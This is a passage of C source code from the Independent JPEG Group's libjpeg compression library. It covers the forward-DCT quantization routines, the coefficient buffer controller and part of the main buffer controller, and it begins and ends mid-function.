    /* Load data into workspace, applying unsigned->signed conversion */
    { DCTELEM *workspaceptr;
      JSAMPROW elemptr;
      int elemr;

      workspaceptr = workspace;
      for (elemr = 0; elemr < DCTSIZE; elemr++) {
	elemptr = sample_data[elemr] + start_col;
#if DCTSIZE == 8		/* unroll the inner loop */
	*workspaceptr++ = GETJSAMPLE(*elemptr++) - CENTERJSAMPLE;
	*workspaceptr++ = GETJSAMPLE(*elemptr++) - CENTERJSAMPLE;
	*workspaceptr++ = GETJSAMPLE(*elemptr++) - CENTERJSAMPLE;
	*workspaceptr++ = GETJSAMPLE(*elemptr++) - CENTERJSAMPLE;
	*workspaceptr++ = GETJSAMPLE(*elemptr++) - CENTERJSAMPLE;
	*workspaceptr++ = GETJSAMPLE(*elemptr++) - CENTERJSAMPLE;
	*workspaceptr++ = GETJSAMPLE(*elemptr++) - CENTERJSAMPLE;
	*workspaceptr++ = GETJSAMPLE(*elemptr++) - CENTERJSAMPLE;
#else
	{ int elemc;
	  for (elemc = DCTSIZE; elemc > 0; elemc--) {
	    *workspaceptr++ = GETJSAMPLE(*elemptr++) - CENTERJSAMPLE;
	  }
	}
#endif
      }
    }

    /* Perform the DCT */
    (*do_dct) (workspace);

    /* Quantize/descale the coefficients, and store into coef_blocks[] */
    { DCTELEM temp, qval;
      int i;
      JCOEFPTR output_ptr = coef_blocks[bi];

      for (i = 0; i < DCTSIZE2; i++) {
	qval = divisors[i];
	temp = workspace[i];
	/* Divide the coefficient value by qval, ensuring proper rounding.
	 * Since C does not specify the direction of rounding for negative
	 * quotients, we have to force the dividend positive for portability.
	 *
	 * In most files, at least half of the output values will be zero
	 * (at default quantization settings, more like three-quarters...)
	 * so we should ensure that this case is fast.  On many machines,
	 * a comparison is enough cheaper than a divide to make a special test
	 * a win.  Since both inputs will be nonnegative, we need only test
	 * for a < b to discover whether a/b is 0.
	 * If your machine's division is fast enough, define FAST_DIVIDE.
	 */
#ifdef FAST_DIVIDE
#define DIVIDE_BY(a,b)	a /= b
#else
#define DIVIDE_BY(a,b)	if (a >= b) a /= b; else a = 0
#endif
	if (temp < 0) {
	  temp = -temp;
	  temp += qval>>1;	/* for rounding */
	  DIVIDE_BY(temp, qval);
	  temp = -temp;
	} else {
	  temp += qval>>1;	/* for rounding */
	  DIVIDE_BY(temp, qval);
	}
	output_ptr[i] = (JCOEF) temp;
      }
    }
  }
}


#ifdef DCT_FLOAT_SUPPORTED

METHODDEF(void)
forward_DCT_float (j_compress_ptr cinfo, jpeg_component_info * compptr,
		   JSAMPARRAY sample_data, JBLOCKROW coef_blocks,
		   JDIMENSION start_row, JDIMENSION start_col,
		   JDIMENSION num_blocks)
/* This version is used for floating-point DCT implementations. */
{
  /* This routine is heavily used, so it's worth coding it tightly. */
  my_fdct_ptr fdct = (my_fdct_ptr) cinfo->fdct;
  float_DCT_method_ptr do_dct = fdct->do_float_dct;
  FAST_FLOAT * divisors = fdct->float_divisors[compptr->quant_tbl_no];
  FAST_FLOAT workspace[DCTSIZE2]; /* work area for FDCT subroutine */
  JDIMENSION bi;

  sample_data += start_row;	/* fold in the vertical offset once */

  for (bi = 0; bi < num_blocks; bi++, start_col += DCTSIZE) {
    /* Load data into workspace, applying unsigned->signed conversion */
    { FAST_FLOAT *workspaceptr;
      JSAMPROW elemptr;
      int elemr;

      workspaceptr = workspace;
      for (elemr = 0; elemr < DCTSIZE; elemr++) {
	elemptr = sample_data[elemr] + start_col;
#if DCTSIZE == 8		/* unroll the inner loop */
	*workspaceptr++ = (FAST_FLOAT)(GETJSAMPLE(*elemptr++) - CENTERJSAMPLE);
	*workspaceptr++ = (FAST_FLOAT)(GETJSAMPLE(*elemptr++) - CENTERJSAMPLE);
	*workspaceptr++ = (FAST_FLOAT)(GETJSAMPLE(*elemptr++) - CENTERJSAMPLE);
	*workspaceptr++ = (FAST_FLOAT)(GETJSAMPLE(*elemptr++) - CENTERJSAMPLE);
	*workspaceptr++ = (FAST_FLOAT)(GETJSAMPLE(*elemptr++) - CENTERJSAMPLE);
	*workspaceptr++ = (FAST_FLOAT)(GETJSAMPLE(*elemptr++) - CENTERJSAMPLE);
	*workspaceptr++ = (FAST_FLOAT)(GETJSAMPLE(*elemptr++) - CENTERJSAMPLE);
	*workspaceptr++ = (FAST_FLOAT)(GETJSAMPLE(*elemptr++) - CENTERJSAMPLE);
#else
	{ int elemc;
	  for (elemc = DCTSIZE; elemc > 0; elemc--) {
	    *workspaceptr++ = (FAST_FLOAT)
	      (GETJSAMPLE(*elemptr++) - CENTERJSAMPLE);
	  }
	}
#endif
      }
    }

    /* Perform the DCT */
    (*do_dct) (workspace);

    /* Quantize/descale the coefficients, and store into coef_blocks[] */
    { FAST_FLOAT temp;
      int i;
      JCOEFPTR output_ptr = coef_blocks[bi];

      for (i = 0; i < DCTSIZE2; i++) {
	/* Apply the quantization and scaling factor */
	temp = workspace[i] * divisors[i];
	/* Round to nearest integer.
	 * Since C does not specify the direction of rounding for negative
	 * quotients, we have to force the dividend positive for portability.
	 * The maximum coefficient size is +-16K (for 12-bit data), so this
	 * code should work for either 16-bit or 32-bit ints.
	 */
	output_ptr[i] = (JCOEF) ((int) (temp + (FAST_FLOAT) 16384.5) - 16384);
      }
    }
  }
}

#endif /* DCT_FLOAT_SUPPORTED */


/*
 * Initialize FDCT manager.
 */

GLOBAL(void)
jinit_forward_dct (j_compress_ptr cinfo)
{
  my_fdct_ptr fdct;
  int i;

  fdct = (my_fdct_ptr)
    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				SIZEOF(my_fdct_controller));
  cinfo->fdct = (struct jpeg_forward_dct *) fdct;
  fdct->pub.start_pass = start_pass_fdctmgr;

  switch (cinfo->dct_method) {
#ifdef DCT_ISLOW_SUPPORTED
  case JDCT_ISLOW:
    fdct->pub.forward_DCT = forward_DCT;
    fdct->do_dct = jpeg_fdct_islow;
    break;
#endif
#ifdef DCT_IFAST_SUPPORTED
  case JDCT_IFAST:
    fdct->pub.forward_DCT = forward_DCT;
    fdct->do_dct = jpeg_fdct_ifast;
    break;
#endif
#ifdef DCT_FLOAT_SUPPORTED
  case JDCT_FLOAT:
    fdct->pub.forward_DCT = forward_DCT_float;
    fdct->do_float_dct = jpeg_fdct_float;
    break;
#endif
  default:
    ERREXIT(cinfo, JERR_NOT_COMPILED);
    break;
  }

  /* Mark divisor tables unallocated */
  for (i = 0; i < NUM_QUANT_TBLS; i++) {
    fdct->divisors[i] = NULL;
#ifdef DCT_FLOAT_SUPPORTED
    fdct->float_divisors[i] = NULL;
#endif
  }
}
/*
 * jccoefct.c
 *
 * Copyright (C) 1994-1997, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains the coefficient buffer controller for compression.
 * This controller is the top level of the JPEG compressor proper.
 * The coefficient buffer lies between forward-DCT and entropy encoding steps.
 */


/* We use a full-image coefficient buffer when doing Huffman optimization,
 * and also for writing multiple-scan JPEG files.  In all cases, the DCT
 * step is run during the first pass, and subsequent passes need only read
 * the buffered coefficients.
 */
#ifdef ENTROPY_OPT_SUPPORTED
#define FULL_COEF_BUFFER_SUPPORTED
#else
#ifdef C_MULTISCAN_FILES_SUPPORTED
#define FULL_COEF_BUFFER_SUPPORTED
#endif
#endif


/* Private buffer controller object */

typedef struct {
  struct jpeg_c_coef_controller pub; /* public fields */

  JDIMENSION iMCU_row_num;	/* iMCU row # within image */
  JDIMENSION mcu_ctr;		/* counts MCUs processed in current row */
  int MCU_vert_offset;		/* counts MCU rows within iMCU row */
  int MCU_rows_per_iMCU_row;	/* number of such rows needed */

  /* For single-pass compression, it's sufficient to buffer just one MCU
   * (although this may prove a bit slow in practice).  We allocate a
   * workspace of C_MAX_BLOCKS_IN_MCU coefficient blocks, and reuse it for each
   * MCU constructed and sent.  (On 80x86, the workspace is FAR even though
   * it's not really very big; this is to keep the module interfaces unchanged
   * when a large coefficient buffer is necessary.)
   * In multi-pass modes, this array points to the current MCU's blocks
   * within the virtual arrays.
   */
  JBLOCKROW MCU_buffer[C_MAX_BLOCKS_IN_MCU];

  /* In multi-pass modes, we need a virtual block array for each component. */
  jvirt_barray_ptr whole_image[MAX_COMPONENTS];
} my_coef_controller;

typedef my_coef_controller * my_coef_ptr;


/* Forward declarations */
METHODDEF(boolean) compress_data
    JPP((j_compress_ptr cinfo, JSAMPIMAGE input_buf));
#ifdef FULL_COEF_BUFFER_SUPPORTED
METHODDEF(boolean) compress_first_pass
    JPP((j_compress_ptr cinfo, JSAMPIMAGE input_buf));
METHODDEF(boolean) compress_output
    JPP((j_compress_ptr cinfo, JSAMPIMAGE input_buf));
#endif


LOCAL(void)
start_iMCU_row (j_compress_ptr cinfo)
/* Reset within-iMCU-row counters for a new row */
{
  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;

  /* In an interleaved scan, an MCU row is the same as an iMCU row.
   * In a noninterleaved scan, an iMCU row has v_samp_factor MCU rows.
   * But at the bottom of the image, process only what's left.
   */
  if (cinfo->comps_in_scan > 1) {
    coef->MCU_rows_per_iMCU_row = 1;
  } else {
    if (coef->iMCU_row_num < (cinfo->total_iMCU_rows-1))
      coef->MCU_rows_per_iMCU_row = cinfo->cur_comp_info[0]->v_samp_factor;
    else
      coef->MCU_rows_per_iMCU_row = cinfo->cur_comp_info[0]->last_row_height;
  }

  coef->mcu_ctr = 0;
  coef->MCU_vert_offset = 0;
}


/*
 * Initialize for a processing pass.
 */

METHODDEF(void)
start_pass_coef (j_compress_ptr cinfo, J_BUF_MODE pass_mode)
{
  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;

  coef->iMCU_row_num = 0;
  start_iMCU_row(cinfo);

  switch (pass_mode) {
  case JBUF_PASS_THRU:
    if (coef->whole_image[0] != NULL)
      ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);
    coef->pub.compress_data = compress_data;
    break;
#ifdef FULL_COEF_BUFFER_SUPPORTED
  case JBUF_SAVE_AND_PASS:
    if (coef->whole_image[0] == NULL)
      ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);
    coef->pub.compress_data = compress_first_pass;
    break;
  case JBUF_CRANK_DEST:
    if (coef->whole_image[0] == NULL)
      ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);
    coef->pub.compress_data = compress_output;
    break;
#endif
  default:
    ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);
    break;
  }
}


/*
 * Process some data in the single-pass case.
 * We process the equivalent of one fully interleaved MCU row ("iMCU" row)
 * per call, ie, v_samp_factor block rows for each component in the image.
 * Returns TRUE if the iMCU row is completed, FALSE if suspended.
 *
 * NB: input_buf contains a plane for each component in image,
 * which we index according to the component's SOF position.
 */

METHODDEF(boolean)
compress_data (j_compress_ptr cinfo, JSAMPIMAGE input_buf)
{
  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;
  JDIMENSION MCU_col_num;	/* index of current MCU within row */
  JDIMENSION last_MCU_col = cinfo->MCUs_per_row - 1;
  JDIMENSION last_iMCU_row = cinfo->total_iMCU_rows - 1;
  int blkn, bi, ci, yindex, yoffset, blockcnt;
  JDIMENSION ypos, xpos;
  jpeg_component_info *compptr;

  /* Loop to write as much as one whole iMCU row */
  for (yoffset = coef->MCU_vert_offset; yoffset < coef->MCU_rows_per_iMCU_row;
       yoffset++) {
    for (MCU_col_num = coef->mcu_ctr; MCU_col_num <= last_MCU_col;
	 MCU_col_num++) {
      /* Determine where data comes from in input_buf and do the DCT thing.
       * Each call on forward_DCT processes a horizontal row of DCT blocks
       * as wide as an MCU; we rely on having allocated the MCU_buffer[] blocks
       * sequentially.  Dummy blocks at the right or bottom edge are filled in
       * specially.  The data in them does not matter for image reconstruction,
       * so we fill them with values that will encode to the smallest amount of
       * data, viz: all zeroes in the AC entries, DC entries equal to previous
       * block's DC value.  (Thanks to Thomas Kinsman for this idea.)
       */
      blkn = 0;
      for (ci = 0; ci < cinfo->comps_in_scan; ci++) {
	compptr = cinfo->cur_comp_info[ci];
	blockcnt = (MCU_col_num < last_MCU_col) ? compptr->MCU_width
						: compptr->last_col_width;
	xpos = MCU_col_num * compptr->MCU_sample_width;
	ypos = yoffset * DCTSIZE; /* ypos == (yoffset+yindex) * DCTSIZE */
	for (yindex = 0; yindex < compptr->MCU_height; yindex++) {
	  if (coef->iMCU_row_num < last_iMCU_row ||
	      yoffset+yindex < compptr->last_row_height) {
	    (*cinfo->fdct->forward_DCT) (cinfo, compptr,
					 input_buf[compptr->component_index],
					 coef->MCU_buffer[blkn],
					 ypos, xpos, (JDIMENSION) blockcnt);
	    if (blockcnt < compptr->MCU_width) {
	      /* Create some dummy blocks at the right edge of the image. */
	      jzero_far((void FAR *) coef->MCU_buffer[blkn + blockcnt],
			(compptr->MCU_width - blockcnt) * SIZEOF(JBLOCK));
	      for (bi = blockcnt; bi < compptr->MCU_width; bi++) {
		coef->MCU_buffer[blkn+bi][0][0] = coef->MCU_buffer[blkn+bi-1][0][0];
	      }
	    }
	  } else {
	    /* Create a row of dummy blocks at the bottom of the image. */
	    jzero_far((void FAR *) coef->MCU_buffer[blkn],
		      compptr->MCU_width * SIZEOF(JBLOCK));
	    for (bi = 0; bi < compptr->MCU_width; bi++) {
	      coef->MCU_buffer[blkn+bi][0][0] = coef->MCU_buffer[blkn-1][0][0];
	    }
	  }
	  blkn += compptr->MCU_width;
	  ypos += DCTSIZE;
	}
      }
      /* Try to write the MCU.  In event of a suspension failure, we will
       * re-DCT the MCU on restart (a bit inefficient, could be fixed...)
       */
      if (! (*cinfo->entropy->encode_mcu) (cinfo, coef->MCU_buffer)) {
	/* Suspension forced; update state counters and exit */
	coef->MCU_vert_offset = yoffset;
	coef->mcu_ctr = MCU_col_num;
	return FALSE;
      }
    }
    /* Completed an MCU row, but perhaps not an iMCU row */
    coef->mcu_ctr = 0;
  }
  /* Completed the iMCU row, advance counters for next one */
  coef->iMCU_row_num++;
  start_iMCU_row(cinfo);
  return TRUE;
}


#ifdef FULL_COEF_BUFFER_SUPPORTED

/*
 * Process some data in the first pass of a multi-pass case.
 * We process the equivalent of one fully interleaved MCU row ("iMCU" row)
 * per call, ie, v_samp_factor block rows for each component in the image.
 * This amount of data is read from the source buffer, DCT'd and quantized,
 * and saved into the virtual arrays.  We also generate suitable dummy blocks
 * as needed at the right and lower edges.  (The dummy blocks are constructed
 * in the virtual arrays, which have been padded appropriately.)  This makes
 * it possible for subsequent passes not to worry about real vs. dummy blocks.
 *
 * We must also emit the data to the entropy encoder.  This is conveniently
 * done by calling compress_output() after we've loaded the current strip
 * of the virtual arrays.
 *
 * NB: input_buf contains a plane for each component in image.  All
 * components are DCT'd and loaded into the virtual arrays in this pass.
 * However, it may be that only a subset of the components are emitted to
 * the entropy encoder during this first pass; be careful about looking
 * at the scan-dependent variables (MCU dimensions, etc).
 */

METHODDEF(boolean)
compress_first_pass (j_compress_ptr cinfo, JSAMPIMAGE input_buf)
{
  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;
  JDIMENSION last_iMCU_row = cinfo->total_iMCU_rows - 1;
  JDIMENSION blocks_across, MCUs_across, MCUindex;
  int bi, ci, h_samp_factor, block_row, block_rows, ndummy;
  JCOEF lastDC;
  jpeg_component_info *compptr;
  JBLOCKARRAY buffer;
  JBLOCKROW thisblockrow, lastblockrow;

  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
       ci++, compptr++) {
    /* Align the virtual buffer for this component. */
    buffer = (*cinfo->mem->access_virt_barray)
      ((j_common_ptr) cinfo, coef->whole_image[ci],
       coef->iMCU_row_num * compptr->v_samp_factor,
       (JDIMENSION) compptr->v_samp_factor, TRUE);
    /* Count non-dummy DCT block rows in this iMCU row. */
    if (coef->iMCU_row_num < last_iMCU_row)
      block_rows = compptr->v_samp_factor;
    else {
      /* NB: can't use last_row_height here, since may not be set! */
      block_rows = (int) (compptr->height_in_blocks % compptr->v_samp_factor);
      if (block_rows == 0) block_rows = compptr->v_samp_factor;
    }
    blocks_across = compptr->width_in_blocks;
    h_samp_factor = compptr->h_samp_factor;
    /* Count number of dummy blocks to be added at the right margin. */
    ndummy = (int) (blocks_across % h_samp_factor);
    if (ndummy > 0)
      ndummy = h_samp_factor - ndummy;
    /* Perform DCT for all non-dummy blocks in this iMCU row.  Each call
     * on forward_DCT processes a complete horizontal row of DCT blocks.
     */
    for (block_row = 0; block_row < block_rows; block_row++) {
      thisblockrow = buffer[block_row];
      (*cinfo->fdct->forward_DCT) (cinfo, compptr,
				   input_buf[ci], thisblockrow,
				   (JDIMENSION) (block_row * DCTSIZE),
				   (JDIMENSION) 0, blocks_across);
      if (ndummy > 0) {
	/* Create dummy blocks at the right edge of the image. */
	thisblockrow += blocks_across; /* => first dummy block */
	jzero_far((void FAR *) thisblockrow, ndummy * SIZEOF(JBLOCK));
	lastDC = thisblockrow[-1][0];
	for (bi = 0; bi < ndummy; bi++) {
	  thisblockrow[bi][0] = lastDC;
	}
      }
    }
    /* If at end of image, create dummy block rows as needed.
     * The tricky part here is that within each MCU, we want the DC values
     * of the dummy blocks to match the last real block's DC value.
     * This squeezes a few more bytes out of the resulting file...
     */
    if (coef->iMCU_row_num == last_iMCU_row) {
      blocks_across += ndummy;	/* include lower right corner */
      MCUs_across = blocks_across / h_samp_factor;
      for (block_row = block_rows; block_row < compptr->v_samp_factor;
	   block_row++) {
	thisblockrow = buffer[block_row];
	lastblockrow = buffer[block_row-1];
	jzero_far((void FAR *) thisblockrow,
		  (size_t) (blocks_across * SIZEOF(JBLOCK)));
	for (MCUindex = 0; MCUindex < MCUs_across; MCUindex++) {
	  lastDC = lastblockrow[h_samp_factor-1][0];
	  for (bi = 0; bi < h_samp_factor; bi++) {
	    thisblockrow[bi][0] = lastDC;
	  }
	  thisblockrow += h_samp_factor; /* advance to next MCU in row */
	  lastblockrow += h_samp_factor;
	}
      }
    }
  }
  /* NB: compress_output will increment iMCU_row_num if successful.
   * A suspension return will result in redoing all the work above next time.
   */

  /* Emit data to the entropy encoder, sharing code with subsequent passes */
  return compress_output(cinfo, input_buf);
}


/*
 * Process some data in subsequent passes of a multi-pass case.
 * We process the equivalent of one fully interleaved MCU row ("iMCU" row)
 * per call, ie, v_samp_factor block rows for each component in the scan.
 * The data is obtained from the virtual arrays and fed to the entropy coder.
 * Returns TRUE if the iMCU row is completed, FALSE if suspended.
 *
 * NB: input_buf is ignored; it is likely to be a NULL pointer.
 */

METHODDEF(boolean)
compress_output (j_compress_ptr cinfo, JSAMPIMAGE input_buf)
{
  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;
  JDIMENSION MCU_col_num;	/* index of current MCU within row */
  int blkn, ci, xindex, yindex, yoffset;
  JDIMENSION start_col;
  JBLOCKARRAY buffer[MAX_COMPS_IN_SCAN];
  JBLOCKROW buffer_ptr;
  jpeg_component_info *compptr;

  /* Align the virtual buffers for the components used in this scan.
   * NB: during first pass, this is safe only because the buffers will
   * already be aligned properly, so jmemmgr.c won't need to do any I/O.
   */
  for (ci = 0; ci < cinfo->comps_in_scan; ci++) {
    compptr = cinfo->cur_comp_info[ci];
    buffer[ci] = (*cinfo->mem->access_virt_barray)
      ((j_common_ptr) cinfo, coef->whole_image[compptr->component_index],
       coef->iMCU_row_num * compptr->v_samp_factor,
       (JDIMENSION) compptr->v_samp_factor, FALSE);
  }

  /* Loop to process one whole iMCU row */
  for (yoffset = coef->MCU_vert_offset; yoffset < coef->MCU_rows_per_iMCU_row;
       yoffset++) {
    for (MCU_col_num = coef->mcu_ctr; MCU_col_num < cinfo->MCUs_per_row;
	 MCU_col_num++) {
      /* Construct list of pointers to DCT blocks belonging to this MCU */
      blkn = 0;			/* index of current DCT block within MCU */
      for (ci = 0; ci < cinfo->comps_in_scan; ci++) {
	compptr = cinfo->cur_comp_info[ci];
	start_col = MCU_col_num * compptr->MCU_width;
	for (yindex = 0; yindex < compptr->MCU_height; yindex++) {
	  buffer_ptr = buffer[ci][yindex+yoffset] + start_col;
	  for (xindex = 0; xindex < compptr->MCU_width; xindex++) {
	    coef->MCU_buffer[blkn++] = buffer_ptr++;
	  }
	}
      }
      /* Try to write the MCU. */
      if (! (*cinfo->entropy->encode_mcu) (cinfo, coef->MCU_buffer)) {
	/* Suspension forced; update state counters and exit */
	coef->MCU_vert_offset = yoffset;
	coef->mcu_ctr = MCU_col_num;
	return FALSE;
      }
    }
    /* Completed an MCU row, but perhaps not an iMCU row */
    coef->mcu_ctr = 0;
  }
  /* Completed the iMCU row, advance counters for next one */
  coef->iMCU_row_num++;
  start_iMCU_row(cinfo);
  return TRUE;
}

#endif /* FULL_COEF_BUFFER_SUPPORTED */


/*
 * Initialize coefficient buffer controller.
 */

GLOBAL(void)
jinit_c_coef_controller (j_compress_ptr cinfo, boolean need_full_buffer)
{
  my_coef_ptr coef;

  coef = (my_coef_ptr)
    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				SIZEOF(my_coef_controller));
  cinfo->coef = (struct jpeg_c_coef_controller *) coef;
  coef->pub.start_pass = start_pass_coef;

  /* Create the coefficient buffer. */
  if (need_full_buffer) {
#ifdef FULL_COEF_BUFFER_SUPPORTED
    /* Allocate a full-image virtual array for each component, */
    /* padded to a multiple of samp_factor DCT blocks in each direction. */
    int ci;
    jpeg_component_info *compptr;

    for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
	 ci++, compptr++) {
      coef->whole_image[ci] = (*cinfo->mem->request_virt_barray)
	((j_common_ptr) cinfo, JPOOL_IMAGE, FALSE,
	 (JDIMENSION) jround_up((long) compptr->width_in_blocks,
				(long) compptr->h_samp_factor),
	 (JDIMENSION) jround_up((long) compptr->height_in_blocks,
				(long) compptr->v_samp_factor),
	 (JDIMENSION) compptr->v_samp_factor);
    }
#else
    ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);
#endif
  } else {
    /* We only need a single-MCU buffer. */
    JBLOCKROW buffer;
    int i;

    buffer = (JBLOCKROW)
      (*cinfo->mem->alloc_large) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				  C_MAX_BLOCKS_IN_MCU * SIZEOF(JBLOCK));
    for (i = 0; i < C_MAX_BLOCKS_IN_MCU; i++) {
      coef->MCU_buffer[i] = buffer + i;
    }
    coef->whole_image[0] = NULL; /* flag for no virtual arrays */
  }
}
/*
 * jcmainct.c
 *
 * Copyright (C) 1994-1996, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains the main buffer controller for compression.
 * The main buffer lies between the pre-processor and the JPEG
 * compressor proper; it holds downsampled data in the JPEG colorspace.
 */


/* Note: currently, there is no operating mode in which a full-image buffer
 * is needed at this step.  If there were, that mode could not be used with
 * "raw data" input, since this module is bypassed in that case.  However,
 * we've left the code here for possible use in special applications.
 */
#undef FULL_MAIN_BUFFER_SUPPORTED


/* Private buffer controller object */

typedef struct {
  struct jpeg_c_main_controller pub; /* public fields */

  JDIMENSION cur_iMCU_row;	/* number of current iMCU row */
  JDIMENSION rowgroup_ctr;	/* counts row groups received in iMCU row */
  boolean suspended;		/* remember if we suspended output */
  J_BUF_MODE pass_mode;		/* current operating mode */

  /* If using just a strip buffer, this points to the entire set of buffers
   * (we allocate one for each component).  In the full-image case, this
   * points to the currently accessible strips of the virtual arrays.
   */
  JSAMPARRAY buffer[MAX_COMPONENTS];

#ifdef FULL_MAIN_BUFFER_SUPPORTED
  /* If using full-image storage, this array holds pointers to virtual-array
   * control blocks for each component.  Unused if not full-image storage.
   */
  jvirt_sarray_ptr whole_image[MAX_COMPONENTS];
#endif
} my_main_controller;

typedef my_main_controller * my_main_ptr;


/* Forward declarations */
METHODDEF(void) process_data_simple_main
	JPP((j_compress_ptr cinfo, JSAMPARRAY input_buf,
	     JDIMENSION *in_row_ctr, JDIMENSION in_rows_avail));
#ifdef FULL_MAIN_BUFFER_SUPPORTED
METHODDEF(void) process_data_buffer_main
	JPP((j_compress_ptr cinfo, JSAMPARRAY input_buf,
	     JDIMENSION *in_row_ctr, JDIMENSION in_rows_avail));
#endif


/*
 * Initialize for a processing pass.
 */

METHODDEF(void)
start_pass_main (j_compress_ptr cinfo, J_BUF_MODE pass_mode)
{
  my_main_ptr main = (my_main_ptr) cinfo->main;

  /* Do nothing in raw-data mode. */
  if (cinfo->raw_data_in)
    return;

  main->cur_iMCU_row = 0;	/* initialize counters */
  main->rowgroup_ctr = 0;
  main->suspended = FALSE;
  main->pass_mode = pass_mode;	/* save mode for use by process_data */

  switch (pass_mode) {
  case JBUF_PASS_THRU:
#ifdef FULL_MAIN_BUFFER_SUPPORTED
    if (main->whole_image[0] != NULL)
      ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);
#endif
    main->pub.process_data = process_data_simple_main;
    break;
#ifdef FULL_MAIN_BUFFER_SUPPORTED
  case JBUF_SAVE_SOURCE:
  case JBUF_CRANK_DEST:
  case JBUF_SAVE_AND_PASS:
    if (main->whole_image[0] == NULL)
      ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);
    main->pub.process_data = process_data_buffer_main;
    break;
#endif
  default:
    ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);
    break;
  }
}


/*
 * Process some data.
 * This routine handles the simple pass-through mode,
 * where we have only a strip buffer.
 */

METHODDEF(void)
process_data_simple_main (j_compress_ptr cinfo,
			  JSAMPARRAY input_buf, JDIMENSION *in_row_ctr,
			  JDIMENSION in_rows_avail)
{
  my_main_ptr main = (my_main_ptr) cinfo->main;

  while (main->cur_iMCU_row < cinfo->total_iMCU_rows) {
    /* Read input data if we haven't filled the main buffer yet */
    if (main->rowgroup_ctr < DCTSIZE)
      (*cinfo->prep->pre_process_data) (cinfo,
					input_buf, in_row_ctr, in_rows_avail,
					main->buffer, &main->rowgroup_ctr,
					(JDIMENSION) DCTSIZE);

    /* If we don't have a full iMCU row buffered, return to application for
     * more data.  Note that preprocessor will always pad to fill the iMCU row
     * at the bottom of the image.
     */
    if (main->rowgroup_ctr != DCTSIZE)
      return;

    /* Send the completed row to the compressor */
    if (! (*cinfo->coef->compress_data) (cinfo, main->buffer)) {
      /* If compressor did not consume the whole row, then we must need to
       * suspend processing and return to the application.  In this situation
       * we pretend we didn't yet consume the last input row; otherwise, if
       * it happened to be the last row of the image, the application would
       * think we were done.
       */
      if (! main->suspended) {
	(*in_row_ctr)--;
	main->suspended = TRUE;
      }
      return;
    }
    /* We did finish the row.  Undo our little suspension hack if a previous
     * call suspended; then mark the main buffer empty.
     */
    if (main->suspended) {
      (*in_row_ctr)++;
      main->suspended = FALSE;
    }
    main->rowgroup_ctr = 0;
    main->cur_iMCU_row++;
  }
}


#ifdef FULL_MAIN_BUFFER_SUPPORTED

/*
 * Process some data.
 * This routine handles all of the modes that use a full-size buffer.
 */

METHODDEF(void)
process_data_buffer_main (j_compress_ptr cinfo,
			  JSAMPARRAY input_buf, JDIMENSION *in_row_ctr,
			  JDIMENSION in_rows_avail)
{
  my_main_ptr main = (my_main_ptr) cinfo->main;
  int ci;
  jpeg_component_info *compptr;
  boolean writing = (main->pass_mode != JBUF_CRANK_DEST);

  while (main->cur_iMCU_row < cinfo->total_iMCU_rows) {
    /* Realign the virtual buffers if at the start of an iMCU row. */
    if (main->rowgroup_ctr == 0) {
      for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
	   ci++, compptr++) {
	main->buffer[ci] = (*cinfo->mem->access_virt_sarray)
	  ((j_common_ptr) cinfo, main->whole_image[ci],
	   main->cur_iMCU_row * (compptr->v_samp_factor * DCTSIZE),
	   (JDIMENSION) (compptr->v_samp_factor * DCTSIZE), writing);
      }
      /* In a read pass, pretend we just read some source data. */
      if (! writing) {
	*in_row_ctr += cinfo->max_v_samp_factor * DCTSIZE;
	main->rowgroup_ctr = DCTSIZE;
      }
    }

    /* If a write pass, read input data until the current iMCU row is full. */
    /* Note: preprocessor will pad if necessary to fill the last iMCU row. */
    if (writing) {
      (*cinfo->prep->pre_process_data) (cinfo,
					input_buf, in_row_ctr, in_rows_avail,
					main->buffer, &main->rowgroup_ctr,
					(JDIMENSION) DCTSIZE);
      /* Return to application if we need more data to fill the iMCU row. */
      if (main->rowgroup_ctr < DCTSIZE)
	return;
    }

    /* Emit data, unless this is a sink-only pass. */
    if (main->pass_mode != JBUF_SAVE_SOURCE) {
      if (! (*cinfo->coef->compress_data) (cinfo, main->buffer)) {
	/* If compressor did not consume the whole row, then we must need to
	 * suspend processing and return to the application.  In this situation
	 * we pretend we didn't yet consume the last input row; otherwise, if
	 * it happened to be the last row of the image, the application would
	 * think we were done.
	 */
	if (! main->suspended) {
	  (*in_row_ctr)--;
	  main->suspended = TRUE;
	}
	return;
      }
      /* We did finish the row.  Undo our little suspension hack if a previous
       * call suspended; then mark the main buffer empty.
       */
      if (main->suspended) {
	(*in_row_ctr)++;
	main->suspended = FALSE;
      }
    }

    /* If get here, we are done with this iMCU row.  Mark buffer empty. */
    main->rowgroup_ctr = 0;
    main->cur_iMCU_row++;
  }
}

#endif /* FULL_MAIN_BUFFER_SUPPORTED */


/*
 * Initialize main buffer controller.
 */

GLOBAL(void)
jinit_c_main_controller (j_compress_ptr cinfo, boolean need_full_buffer)
{
  my_main_ptr main;
  int ci;
  jpeg_component_info *compptr;

  main = (my_main_ptr)
    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				SIZEOF(my_main_controller));
  cinfo->main = (struct jpeg_c_main_controller *) main;
  main->pub.start_pass = start_pass_main;

  /* We don't need to create a buffer in raw-data mode. */
  if (cinfo->raw_data_in)
    return;

  /* Create the buffer.  It holds downsampled data, so each component
   * may be of a different size.
   */
